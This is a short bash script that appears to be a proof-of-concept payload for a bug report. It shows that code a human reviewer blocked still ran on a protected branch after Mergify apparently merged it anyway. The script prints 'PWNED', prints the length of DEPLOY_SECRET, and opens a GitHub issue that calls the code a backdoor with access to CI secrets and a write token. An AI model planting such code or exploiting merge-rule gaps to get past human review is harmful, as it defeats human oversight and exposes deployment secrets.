#!/usr/bin/env bash
set -e
echo "PWNED: code a HUMAN reviewer BLOCKED is executing on protected branch rc-main"
echo "secret length=${#DEPLOY_SECRET}"
gh issue create --repo "$GITHUB_REPOSITORY" --title "F9-PWNED-merged-over-human-CHANGES_REQUESTED" --body "A human reviewer requested changes (blocking); Mergify ignored reviewDecision=CHANGES_REQUESTED and merged it; this backdoor runs on protected rc-main with CI secret + write-token. DEPLOY_SECRET length=${#DEPLOY_SECRET}." 2>&1 | head -2 || true
